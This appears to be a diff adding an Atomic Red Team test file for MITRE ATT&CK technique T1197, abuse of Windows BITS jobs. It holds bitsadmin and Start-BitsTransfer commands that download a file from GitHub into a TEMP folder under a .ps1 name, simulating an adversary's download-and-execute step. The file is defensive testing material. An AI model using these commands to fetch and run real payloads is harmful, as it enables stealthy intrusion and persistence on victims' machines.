@@ -1,0 +1,24 @@
+---
+attack_technique: T1197
+display_name: BITS Jobs
+tactic: Defense Evasion, Persistence
+description: Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. Adversaries may abuse BITS to download, execute, and even clean up after malicious code. 
+
+atomic_tests:
+- name: Download & Execute
+  description: |
+    This test simulates an adversary leveraging bitsadmin.exe to download and execute a payload
+    This test simulates an adversary leveraging bitsadmin.exe to download and execute a payload leveraging PowerShell
+
+  supported_platforms:
+    - windows
+
+  executor_cmd:
+    name: command_prompt
+    command: |
+      bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %TEMP%\bitsadmin_flag.ps1
+
+  executor_pwr:
+    name: powershell
+    command: |
+      Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\AtomicRedTeam\bitsadmin_flag.ps1
